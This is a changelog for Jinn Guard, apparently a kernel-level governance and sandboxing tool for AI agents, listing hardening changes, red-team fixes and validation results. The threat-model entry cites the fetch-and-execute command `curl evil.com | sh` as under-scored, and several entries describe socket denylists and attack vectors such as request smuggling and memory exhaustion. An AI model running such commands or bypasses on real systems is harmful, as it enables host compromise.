# Changelog

All notable changes to Jinn Guard are documented here. This project is a
validated research prototype / controlled-pilot MVP; see
[`THREAT_MODEL.md`](THREAT_MODEL.md) for the security model and honest scope.

## [Unreleased]

Operability and review-driven hardening (moving toward pilot-ready).

### Added
- **Bounded HMAC admission-key rotation.** The daemon now supports a supervised
  current/previous admission keyset: `--secret-file` remains the current signing
  key, while `--previous-secret-file` plus
  `--previous-secret-valid-until <unix-epoch-seconds>` allows proposals signed
  with the old key only during a bounded grace window. Partial rotation config,
  empty keys, or identical current/previous keys fail closed at startup
  (`code=78 kind=SECRET_ROTATION_CONFIG`). MCP synthetic identities and fleet
  bundle verification continue to use the current key only.
- **Optional RootAI remote semantic scorer over mTLS.** The daemon can now use a
  remote RootAI semantic scorer with `--rootai-url <https-url>` plus
  `--rootai-tls-cert`, `--rootai-tls-key` and `--rootai-tls-ca` supplied
  together. Partial TLS config is a fatal startup error, plaintext remote URLs
  are rejected, and `--rootai-url` is mutually exclusive with the local
  `--rootai-socket`. Runtime remote failures, oversized responses, parse errors,
  or low-confidence responses fail soft to the local heuristic classifier so the
  scorer never gates daemon availability or creates a new allow path.
- **Audit boot marker for ostree provenance.** The daemon now appends one
  synthetic boot marker through the normal audit hash-chain at startup before
  governed decisions. The marker records the ostree/non-ostree host flag, booted
  ostree commit when available, and kernel release; provenance failures collapse
  to `null`/`unknown` and never gate startup or enforcement. The independent
  audit-chain verifier now surfaces the marker after integrity verification.
- **rpm-ostree BPF-LSM arming helper.** Added `deploy/arm-lsm-ostree.sh` for
  immutable hosts booted via rpm-ostree. The helper is a non-ostree no-op,
  preserves every module in `/sys/kernel/security/lsm`, stages `lsm=...,bpf`
  with `rpm-ostree kargs` without touching grub, prints the computed change
  before applying it, and prints the exact revert command. The installer invokes
  it only on `/run/ostree-booted` hosts before the existing BPF-LSM active check.

### Security / hardening
- **Internal red-team batch 5 — lineage/quota integration fixes (JG-RT-007, MED).**
  The UDS verdict path rejected exact duplicate nonces but did not enforce the
  persisted lineage monotonic sequence invariant, so a valid signer could send a
  lower, fresh sequence after a higher one. UDS lineage updates also stayed
  in-memory only, unlike the MCP path, and the post-gate ALLOW fast-paths could
  quota-count without refreshing lineage state. The daemon now reserves monotonic
  sequence state under the lineage lock, persists UDS lineage updates, and routes
  system-immunity / outside-scope ALLOWs through the shared lineage helper.
  Integration tests added for out-of-order denial and fast-path persistence.
- **Internal red-team batch 4 — admission-secret caching (JG-RT-006, LOW).** The
  UDS verdict loop reloaded the HMAC secret file for every framed proposal, so a
  privileged local actor who removed the backing `--secret-file` after startup could
  make the next frame trigger `SECRET_MISSING` and terminate the daemon. The
  admission secret is now loaded once at startup and shared with UDS connection
  tasks, matching the MCP gateway path; rotation remains a supervised restart
  operation. Integration test added for a two-frame connection where the secret file
  is removed between frames.
- **Full effective-set capability deprivilege (JG #11 / #59 batch 3).** Under
  `JINNGUARD_HARDEN_CAPS=1`, after BPF attach the daemon now reduces its **live**
  (effective + permitted) capabilities to the minimal `RETAINED_CAPS` via `capset(2)`
  — previously only the *bounding* set was dropped (which prevents re-acquisition but
  not use). A post-compromise daemon can no longer wield `CAP_SYS_MODULE`,
  `CAP_NET_ADMIN`, etc. The real-kernel matrix now runs its armed allow/deny tests
  **with hardening enabled** on 5.14/6.12/6.17, so a drop that broke BPF map ops or
  enforcement fails CI. Closes the "full effective-set deprivilege" THREAT_MODEL item.
- **Internal red-team batch 3 — log-injection fix (JG-RT-005, LOW).** The human
  console explanation interpolated attacker-controlled fields (agent_id, resource
  path, action, reasons) raw, so an embedded newline could forge a fake
  `[JINN-GUARD] ALLOW …` line. Control characters in those fields are now neutralised
  before the human log (the structured JSON log was already serde-safe). Test added.
- **Internal red-team batch 2 — kernel floor / proof / fleet review (JG #59).** Audited
  the fleet bundle verifier, the Z3 policy-proof path, the BPF `socket_connect` hook,
  and the capability-hardening sequence — all found **sound** (content-bound signed
  bundles with rollback-before-signature; SMT timeout→`Unknown`→DENY fail-closed;
  null-checked/bounded BPF map access behind the kernel verifier + matrix; cap drop
  ordered after BPF attach, bounding-set only). One **LOW** defense-in-depth finding
  (**JG-RT-004**): a policy invariant over a *caller-supplied* variable fails open if
  the variable is omitted — documented in-code with author guidance; semantics
  deliberately not flipped (it is a test-pinned design choice and a DiD layer). See
  [`RED_TEAM_FINDINGS.md`](RED_TEAM_FINDINGS.md).
- **Internal red-team batch 1 — fixed 3 reachable issues (JG #59).** See
  [`RED_TEAM_FINDINGS.md`](RED_TEAM_FINDINGS.md). **JG-RT-001 (HIGH):** the MCP
  gateway allocated a request body directly from the attacker-controlled
  `Content-Length` with no bound — a remote, unauthenticated (mTLS off) memory-
  exhaustion DoS; now capped at 4 MiB (`MAX_MCP_BODY_BYTES`) before allocation.
  **JG-RT-002 (MED):** the replay nonce cache grew unbounded; replaced with a bounded
  FIFO `ReplayGuard` (2²⁰ entries) so a long-lived or authenticated-hostile client
  can no longer exhaust daemon memory. **JG-RT-003 (MED):** the gateway's upstream
  forwarder now refuses control characters in client-derived method/path/Host,
  closing a CRLF/request-smuggling vector defensively. All three covered by new unit
  tests; `ts_wire`, audit persistence, secret loading and the new mTLS path reviewed
  and found sound.
- **Optional mTLS for the MCP gateway (JG #11).** The MCP enforcement proxy can now
  require **mutual TLS**: pass `--mcp-tls-cert`, `--mcp-tls-key` and `--mcp-tls-ca`
  together and the gateway presents its certificate and **requires + verifies a
  client certificate** chaining to the given CA before any request reaches the
  governance pipeline. A client with no certificate, or one not signed by the CA,
  fails the handshake and is dropped (**fail-closed**) — closing the prior gap where
  the gateway authenticated callers only by a synthetic per-IP id over plaintext TCP.
  Off by default (plain TCP, unchanged); a *partial* flag combination is a fatal
  config error (`code=78 kind=MCP_TLS_CONFIG`) rather than a silent plaintext
  fallback. Built on `openssl` (already in the tree) + `tokio-openssl`; the
  per-connection handler is now transport-generic. 3 new unit tests
  (valid material builds, missing files rejected, key/cert mismatch rejected).
- **Audit-log observability metrics (JG #11 monitoring).** The opt-in, loopback-only
  Prometheus endpoint now surfaces the audit log's tamper-evidence and
  data-protection posture: `jinnguard_audit_chain_entries` (gauge),
  `jinnguard_audit_chain_intact` (0/1 gauge — result of the last `verify_chain`),
  `jinnguard_audit_salt_epoch` (gauge — active rotation epoch, #11),
  `jinnguard_audit_erasures_total` and `jinnguard_audit_erased_rows_total`
  (counters — honoured Art. 17 erasures, for Art. 5(2) accountability). The
  `AuditLogger` pushes its state on log/rotate/erase; `refresh_chain_health_metric()`
  runs a verification and publishes the intact gauge (for a periodic daemon tick,
  off the hot logging path). No new dependencies; scraper never touches the audit DB.
- **Automated audit pseudonym-salt rotation (JG #11).** The audit log's per-install
  pseudonym salt can now be **rotated** (`AuditLogger::rotate_pseudonym_salt`, or
  automatically at startup once a salt exceeds `JINNGUARD_AUDIT_SALT_MAX_AGE_SECS`).
  Each rotation opens a new salt *epoch*, so a subject's future `subject_pseudonym`
  no longer links to its past one — limiting long-horizon correlation/profiling
  across the chain (strengthens Art. 4(5) pseudonymisation / Art. 5(1)(c)
  minimisation). Historical epochs are retained: a uid resolves to all of its
  pseudonyms (`pseudonyms_for_uid_all_epochs`) and a rotation-aware erasure
  (`erase_uid`) reaches PII written under **any** salt. Rotation never touches the
  hash chain — `verify_chain` is unchanged before/after. Default off (preserves the
  prior single-salt behaviour); pre-rotation installs adopt their existing salt as
  epoch 1 so already-written pseudonyms keep resolving. Backed by 4 new unit tests
  (policy, rotation, cross-epoch erasure, legacy adoption).
- **Release integrity pipeline — SLSA provenance + cosign signatures (JG #46 Phase 2).**
  Adds [`release.yml`](.github/workflows/release.yml), a tag-triggered (`v*`) release
  workflow that builds the binary + CycloneDX SBOM, generates **SLSA v3 build
  provenance** (slsa-github-generator), **signs** the binary and SBOM with **cosign
  keyless** (Sigstore/OIDC — no long-lived key), and publishes everything to a GitHub
  Release with checksums. [`RELEASE_INTEGRITY.md`](RELEASE_INTEGRITY.md) documents the
  `cosign verify-blob` / `slsa-verifier` steps and the expected OIDC build identity.
  The workflow is inert until a maintainer pushes a version tag. Builds pin
  `SOURCE_DATE_EPOCH` + `--locked`; **independently-verified reproducible builds
  remain the one open sub-item of #46** (documented honestly, not claimed).
- **Deputy-governance design note — caller-identity propagation (JG #57).** Adds
  [`DEPUTY_GOVERNANCE.md`](DEPUTY_GOVERNANCE.md), the design/research record for the
  confused-deputy "complete but hard fix." It evaluates four approaches (deputy-side
  LSM mediation, an authenticating broker, capability tokens, kernel-side credential
  correlation) and identifies the **smallest buildable increment** on stock BPF-LSM:
  make the #55/#56 connect defense **peer-identity-keyed instead of path-keyed** —
  deny a governed agent's connect to any socket *owned by an ungoverned privileged
  process*, which collapses the abstract-namespace / bind-mount / unlisted-deputy
  residual into one rule. Anti-lockout invariants and a 5.14-verifier feasibility
  caveat are spelled out; deputy *action attribution* is documented as open research.
  Design only — no enforcement change in this entry. Cross-linked from
  [`THREAT_MODEL.md`](THREAT_MODEL.md).
- **Supply-chain policy enforced in CI + CycloneDX SBOM (JG #46).** A committed
  `deny.toml` is now gated on every push/PR by a `cargo deny check` job covering
  four axes: known security **advisories** (yanked crates denied; the single
  accepted exception — `RUSTSEC-2025-0134`, the *unmaintained* `rustls-pemfile`
  pulled transitively via `reqwest` 0.11, not a vulnerability — is documented
  inline with a removal trigger), **license** compliance (explicit permissive
  allowlist; copyleft denied), **banned/wildcard** crates (wildcard versions
  denied except internal workspace path deps), and crate **source** provenance
  (crates.io only). The same job emits a CycloneDX SBOM of the resolved
  dependency graph and publishes it as a downloadable build artifact, so every
  binary ships with a machine-readable bill of materials. The three workspace
  crates now declare `license = "Apache-2.0"` and `publish = false`. (SLSA
  provenance and signed/reproducible builds remain open sub-items of #46.)
- **GDPR/erasure-safe audit logging — crypto-shredding + data minimisation (JG #61).**
  The tamper-evident SHA-256 hash chain previously embedded personal data
  (uid/gid, executable path, full command-line argv) directly in each entry,
  putting immutability in conflict with the **right to erasure (Art. 17)** and
  **storage limitation (Art. 5(1)(e))**. Now the chain commits only to a
  *PII-free* projection: a per-install **subject pseudonym** (Art. 4(5)), an
  opaque `pii_ref`, and an **`HMAC(per-record salt, PII)` commitment**. The actual
  personal data lives in a separate, erasable `audit_pii` store. `erase_subject()`
  deletes a subject's rows (and their commitment salts) — **crypto-shredding**:
  the data becomes unrecoverable while *every hash in the chain still verifies*.
  `verify_chain()` returns the same intact result before and after erasure (pinned
  by a unit test). Adds `read_subject_pii()` for **right of access (Art. 15)** and
  an opt-in **argv data-minimisation** mode (`JINNGUARD_AUDIT_MINIMIZE_ARGV=1` or
  `AuditLogger::with_argv_minimization`) that never persists argument *values*.
  No new dependencies (HMAC-SHA256 + `/dev/urandom`); `log()`'s signature and all
  call sites are unchanged — redaction happens inside the logger.
- **Confused-deputy detection: governed connects to orchestrator/init control
  sockets are now surfaced (JG #58).** The kernel already *denies* a governed
  agent's connect to docker/containerd/podman/crio/libvirt/D-Bus/systemd control
  sockets (#55); this adds the operator-facing *detection* signal. Every such
  attempt emits a single greppable `[JINNGUARD DEPUTY ALERT]` line (pid,
  orchestrator, socket, verdict, process) and increments a new Prometheus counter
  `jinnguard_orchestrator_socket_attempts_total{orchestrator,verdict}`. An `allow`
  here is the louder alarm — it means a deputy path is open. Detection only: it
  never changes the verdict. The classifier is a pure, exhaustively unit-tested
  function (exact-match, `/run` vs `/var/run`, non-orchestrator/abstract/IP
  destinations rejected) that mirrors the in-kernel denylist.
- **Anti-lockout invariants regression-tested on real kernels (JG #43).** Two new
  armed `kernel_lsm` tests assert the guarantees that keep governance from bricking
  the host: (1) `test_kernel_ungoverned_host_is_never_locked_out` — the dual of the
  unsheddable-subtree test — proves the *same* operation denied inside the governed
  cgroup succeeds once the actor steps out of scope, so the operator's shell/desktop
  is structurally never denied; (2)
  `test_kernel_anti_lockout_governor_reachable_under_all_floors` — with the IPv4
  egress floor (#54), the AF_UNIX allowlist floor (#56), and the orchestrator
  denylist (#55) all armed and no operator allowlist entries, the Jinn Guard control
  socket and loopback stay reachable while a non-allowlisted unix connect is denied
  in the same run (so the reachability assertions are non-vacuous). Both run in the
  three-distro real-kernel matrix (6.12 / 6.17 / 5.14).
- **Z3 solver per-check timeout (250 ms), fail-closed.** The SMT solver now runs
  under a bounded timeout so a pathological or maliciously complex policy cannot
  stall a decision; on timeout Z3 returns `Unknown`, which is treated as **DENY**.
- **`THREAT_MODEL.md` §8 "Threats to validity — the risk model."** Documents
  honestly what the Z3 proof does and does *not* establish: the guarantee is
  conditional on a heuristic risk classifier (default score 35; e.g.
  `curl evil.com | sh` is under-scored), the risk/Z3 layer is defense-in-depth
  rather than the primary gate (intent allowlist + kernel exec enforcement are),
  and client-declared risk can only *raise* the score, never lower it. Adds
  model-based scoring and interpreter child-process attribution to the open items.

### Added
- **`SECURITY_ARCHITECTURE.md` — security architecture & trust-boundary doc (JG #39).**
  The structural companion to `THREAT_MODEL.md`: the two-plane enforcement model
  (cooperative user-space gate chain + non-cooperative kernel eBPF-LSM floor), the
  crate/module map, all 10 LSM hooks, an 8-row trust-boundary table, the
  cooperative/non-cooperative data flows, the audit/data-protection plane, the
  open-core boundary, key management, and the fail-closed posture — each tied to
  real code and cross-linked to the threat model. Linked from `README.md` and
  `THREAT_MODEL.md` §1.
- **Signed fleet-policy client hook (`--fleet-policy-url`), gated behind the
  `fleet` Cargo feature** (part of `--features enterprise`; **off by default**).
  When built with the feature, the daemon can pull a signed, versioned
  `PolicyBundle` from an external fleet control plane, verify its HMAC-SHA256
  signature (`--fleet-secret-file`, default: admission secret), enforce rollback
  protection (version must not regress), cache the last good bundle for offline
  restart (`--fleet-policy-cache`), and hot-reload on change. Every failure path
  keeps the current policy (fail-safe). Default public builds are **single-node**
  and never reach the network for policy. The control-plane *server* that issues
  these bundles is **not** in this repo — it lives in the private
  `jinn-guard-enterprise` repo. This flag is the stable open-core integration
  seam a fleet manager connects to. Validated end-to-end against the live daemon
  (correct key applies v1→v2, wrong key rejected, offline cache written).
- **Prometheus `/metrics` endpoint** (opt-in via `JINNGUARD_METRICS_PORT`,
  loopback-only). Dependency-free; exposes uptime, proposals, userspace
  allow/deny (with denial reasons), kernel-LSM allow/deny, and build info. Adds a
  `/healthz` liveness probe. No behavior change when unset.
- **`OPERATOR_RUNBOOK.md`** — install, configuration, operating modes, start/stop,
  monitoring, health checks, upgrade/rollback, incident response (disable
  enforcement fast), exit-code reference, and troubleshooting.
- **Fleet accept/reject decision is now a pure, tested function**
  (`fleet_policy::evaluate_bundle`). The daemon's refresh loop calls it, so the
  unit tests cover the exact production path: apply-forward, reject-rollback
  (version below the floor), reject-bad-signature, and already-applied no-op
  (incl. rollback taking precedence over a bad signature). A new CI job (**Fleet
  feature gate**) builds, clippy-checks, and runs these with `--features fleet`,
  so the gated open-core client can't silently rot.

### Fixed
- **Adversarial harness binary auto-detection.** `tests/swarm_attack.rs` used to
  hard-code `target/debug/ts_cli`, so the documented reproduce command
  `cargo test --release --test swarm_attack` failed with a spurious
  `No such file or directory` on a clean checkout unless `JINNGUARD_TEST_BINARY`
  was set by hand. The harness now auto-detects the daemon binary (prefers the
  test's own build profile, falls back to the other), so both `cargo test` and
  `cargo test --release` work out of the box; the env var still overrides.
  Verified on a second host (Azure Debian 13 / Xeon): 12/12 adversarial tests
  pass, 0 fail-open.

## [v1.0.0-rc2] — 2026-06-11

Productionization hardening (M7) and a green CI. No behavior change to the
governance or enforcement paths; everything validated in rc1 still holds.

### Added
- **eBPF compilation gated in CI.** The `build-ebpf` job now installs `bpftool`,
  generates `vmlinux.h` from the runner's BTF, and compiles all five LSM objects
  with the validated clang flags. It no longer `continue-on-error`s — a change
  that breaks BPF compilation now fails the build.
- **Structured CLI exit codes.** Startup failures emit a single machine-parseable
  line (`jinnguard: fatal code=<n> kind=<KIND> msg="…"`) and exit with a
  sysexits-style code so a supervisor can branch on the cause: `78` config
  (missing HMAC secret), `69` kernel LSM unavailable, `70` internal. Unit-tested.
- **Opt-in capability hardening.** With `JINNGUARD_HARDEN_CAPS=1`, after the LSM
  programs are loaded the daemon sets `no_new_privs` and drops a curated set of
  dangerous capabilities (CAP_SYS_MODULE, CAP_NET_ADMIN, CAP_SYS_BOOT, …) from
  the bounding set. Default off; never removes a capability the daemon needs at
  runtime (guarded by a unit test) so enforcement is unaffected.

### Changed
- **CI is fully green.** Resolved pre-existing `cargo fmt --check` and
  `cargo clippy -- -D warnings` failures (manual suffix-strip → `strip_suffix`,
  `iter().any()` → `Vec::contains`, an explicit `too_many_arguments` allow on the
  MCP connection handler, and `dead_code` allows on items live only under the
  `kernel_telemetry` verdict path / tests). No behavior change.

## [v1.0.0-rc1] — 2026-06-11

First labeled release candidate. The governance pipeline, kernel enforcement,
and operator-safety guarantees are feature-complete and validated on a real
Linux 6.12 host across all four validation tiers.

### Highlights
- **Kernel enforcement validated, armed, on real hardware.** 2,500 enforced
  operations across execve / TCP / UDP / file-create / file-unlink with
  **0 fail-open** and **0 incorrect decisions** (Tier 4).
- **Operator can never be locked out.** Enforcement is now cgroup-scoped in the
  kernel: only the governed cgroup is subject to allow/deny; every other task —
  including the operator's desktop — passes through untouched. Validated armed on
  a single-machine laptop with no lockout.

### Added
- **Anti-lockout invariants (M1).** `operator_safety_invariants` (default build)
  and `safe_mode_invariants` (kernel-feature build) pin the guarantee that
  base-system/desktop processes are always allowed and safe mode stays audit-only.
  CI runs the kernel-feature tests.
- **Policy-driven enforcement scope (M3).** `enforcement_scope.governed_path_prefixes`
  makes governance host-wide and additive, with two anti-lockout guards
  (base-system prefixes rejected at install and re-excluded at lookup).
- **Adaptive layer with deterministic floors (M6).** Per-agent, bounded
  (cap 40.0), monotonic, tighten-only risk penalty applied before Z3 and the hard
  ceiling. Never loosens a decision; properties pinned by `adaptive_floor_tests`.
- **cgroup-scoped kernel enforcement (M5b).** `bpf_get_current_cgroup_id()` gate
  in all five LSM hooks; daemon resolves `JINNGUARD_GOVERN_CGROUP` to a cgroup id
  and sets the scope map before attach. Fails safe toward the operator.
- **Reviewer deliverable (M7).** One-command, capability-aware
  `scripts/run_professor_validation.sh` (4 tiers), `PROFESSOR_VALIDATION.md`, and
  an artifact-free review package builder (`scripts/make_review_package.sh`).
- **Threat model & security review (M8).** [`THREAT_MODEL.md`](THREAT_MODEL.md) —
  trust boundaries, adversary model, threat→mitigation mapping with evidence, CVE
  log, and disclosed residual risks.

### Fixed
- **JG-ADV-2026-002 (Critical) — filesystem policy bypass via relative paths.**
  Kernel now resolves the full absolute path before the denylist check
  (`jg_read_dentry_path`, depth-12 dentry walk). Verified audit-only and armed.
- **JG-ADV-2026-001 (High) — execve bypass via interpreter chains.** Governed agents
  are denied known interpreters (`DENY_INTERPRETER_NOT_ALLOWED`).
- **Fail-open regression (enterprise18).** The `system_immunity` and
  "out-of-scope" ALLOW fast-paths ran *before* the gate chain, letting
  authenticated proposals short-circuit replay/identity/quota/Z3. Relocated to
  STEP 11.5, after the full chain. Restores 13/13 integration + 12/12 swarm.
- **Stale pinned ring buffer on restart.** A restarted daemon re-attached to a
  stale `LIBBPF_PIN_BY_NAME` ring buffer and saw zero telemetry;
  `clear_stale_request_pin()` now clears it on startup.
- **Validator robustness.** Cargo-under-sudo PATH, Docker-compose log prefixes,
  and running the kernel suite via a prebuilt test binary (cargo is not on root's
  PATH) — all fixed so the one-command validator works on a clean host.

### Validation (real Linux 6.12 host)
| Tier | Result |
|---|---|
| 1 — full suite (~117 tests) | PASS |
| 2 — Docker mandatory mediation (7/7 probes) | PASS |
| 3 — kernel full-path resolution (audit-only) | PASS |
| 4 — kernel allow/deny enforcement (cgroup-scoped) | PASS, 0 fail-open |

### Known limitations
- Not independently audited; single-distribution (Debian) validation.
- Sub-mount filesystem path *strings* (telemetry) are relative to their mount
  root; the enforcement decision keys on the directory's `(s_dev, i_ino)` identity
  (JG #52), so a mount/bind/`pivot_root` remap cannot fool it (THREAT_MODEL §7.1).
- Interpreter chains mitigated, not eliminated.
- Per-agent secrets / `agent_id`↔UID binding remain future multi-tenant work.

See [`THREAT_MODEL.md`](THREAT_MODEL.md) §7 and §9 for the full list and the path
to audited GA.
